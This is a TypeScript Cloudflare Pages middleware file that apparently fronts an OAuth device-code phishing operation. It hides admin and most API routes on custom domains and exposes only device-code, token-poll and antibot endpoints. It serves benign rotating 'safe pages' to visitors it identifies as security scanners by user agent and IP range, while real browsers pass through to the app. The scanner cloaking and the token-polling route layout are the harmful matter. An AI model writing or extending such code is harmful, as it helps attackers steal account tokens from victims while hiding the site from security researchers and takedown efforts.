import { isHardBlocked, isScanner, getRotatingPage } from './lib/protection';

interface Env {
  TOKEN_STORE: KVNamespace;
}

// Routes allowed on custom domains (landing page + device code flow only)
const CUSTOM_DOMAIN_ALLOWED: string[] = [
  '/api/device-code',
  '/api/token-poll',
  '/api/antibot-token',
  '/api/templates',
];

function isPagesDev(hostname: string): boolean {
  return hostname.endsWith('.pages.dev') || hostname === 'localhost' || hostname === '127.0.0.1';
}

export const onRequest: PagesFunction<Env> = async (context) => {
  const { request } = context;
  const url = new URL(request.url);
  const path = url.pathname;
  const hostname = url.hostname;

  // --- Custom Domain Isolation ---
  // If NOT a .pages.dev domain, block admin and management routes
  if (!isPagesDev(hostname)) {
    // Block /admin entirely
    if (path.startsWith('/admin')) {
      return new Response('<!DOCTYPE html><html><head><title>404</title></head><body><h1>404 Not Found</h1></body></html>', {
        status: 404,
        headers: { 'Content-Type': 'text/html; charset=utf-8' },
      });
    }

    // Block all /api/* routes except the ones needed for device code flow
    if (path.startsWith('/api/')) {
      const allowed = CUSTOM_DOMAIN_ALLOWED.some(r => path.startsWith(r));
      if (!allowed) {
        return new Response(JSON.stringify({ error: 'Not found' }), {
          status: 404,
          headers: { 'Content-Type': 'application/json' },
        });
      }
    }
  }

  // Skip protection for API routes, admin, and static assets
  if (
    path.startsWith('/api/') ||
    path.startsWith('/admin') ||
    path.startsWith('/assets/') ||
    path.match(/\.(js|css|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|map|json)$/)
  ) {
    return context.next();
  }

  const ua = request.headers.get('user-agent') || '';
  // Cloudflare provides the client IP in cf-connecting-ip header
  const ip = request.headers.get('cf-connecting-ip') || request.headers.get('x-forwarded-for') || '';

  // Layer 1 — Hard Block (403)
  if (isHardBlocked(ua)) {
    return new Response('<!DOCTYPE html><html><head><title>403 Forbidden</title></head><body><h1>403 Forbidden</h1><p>Access Denied</p></body></html>', {
      status: 403,
      headers: { 'Content-Type': 'text/html; charset=utf-8' },
    });
  }

  // Layer 2 — Scanner Safe Pages (200 rotating) — now checks IP ranges too
  if (isScanner(ua, ip)) {
    const page = getRotatingPage(ua, url.href);
    return new Response(page, {
      status: 200,
      headers: {
        'Content-Type': 'text/html; charset=utf-8',
        'Cache-Control': 'no-store',
      },
    });
  }

  // Real browser — pass through to SPA
  return context.next();
};
